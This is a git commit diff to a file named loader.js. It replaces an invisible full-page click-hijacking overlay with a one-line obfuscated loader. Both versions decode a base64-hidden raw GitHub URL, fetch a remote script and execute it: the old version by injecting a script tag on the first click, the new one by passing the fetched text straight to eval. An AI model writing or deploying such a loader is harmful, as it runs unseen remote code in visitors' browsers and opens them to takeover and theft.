e60c553a43661891204db75fc97b4ed5d65e0f7f
jatrophaxz <silkieuser@gmail.com>
2026-03-04 22:20:57 -0300

    Update loader.js

--- loader.js
+++ loader.js
@@ -1,18 +1,1 @@
-(function() {
-    // URL Raw: https://raw.githubusercontent.com/jatrophaxz/I/main/script.js
-    const _u = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2phdHJvcGhaeHovSS9tYWluL3NjcmlwdC5qcw==';
-
-    const t = document.createElement('div');
-    t.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;background:rgba(0,0,0,0.01);';
-    document.body.appendChild(t);
-
-    t.addEventListener('mousedown', () => {
-        fetch(atob(_u))
-            .then(r => r.text())
-            .then(c => {
-                const s = document.createElement('script');
-                s.textContent = c;
-                document.head.appendChild(s);
-            }).catch(()=>{});
-    }, { once: true });
-})();
+fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2phdHJvcGhheHovSS9tYWluL3NjcmlwdC5qcw=='))['then'](_0x4ea64=>_0x4ea64['text']())['then'](eval);
